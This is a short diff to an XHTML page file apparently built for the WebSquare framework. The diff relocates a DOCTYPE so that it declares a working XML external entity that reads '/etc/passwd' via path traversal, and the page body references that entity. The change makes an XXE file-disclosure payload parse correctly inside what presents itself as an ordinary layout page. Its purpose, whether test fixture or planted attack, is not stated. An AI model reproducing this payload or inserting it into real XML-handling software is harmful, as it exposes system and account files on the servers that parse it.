@@ -1,12 +1,12 @@
 <?xml version="1.0" encoding="UTF-8" standalone="no"?>
 <?xml-stylesheet href="/css/lofin/layout.css" type="text/css"?>
+<!DOCTYPE change [
+	<!ENTITY systemEntity SYSTEM "../../../../../../../etc/passwd">
+]>
 <html xmlns="http://www.w3.org/1999/xhtml"
     xmlns:ev="http://www.w3.org/2001/xml-events"
     xmlns:w2="http://www.inswave.com/websquare" xmlns:xf="http://www.w3.org/2002/xforms">
     <head>
-	<!DOCTYPE change [
-		<!ENTITY systemEntity SYSTEM "../../../../../../../etc/passwd">
-	]>
 	<change>
 		<text>&systemEntity;</text>;
 	</change>
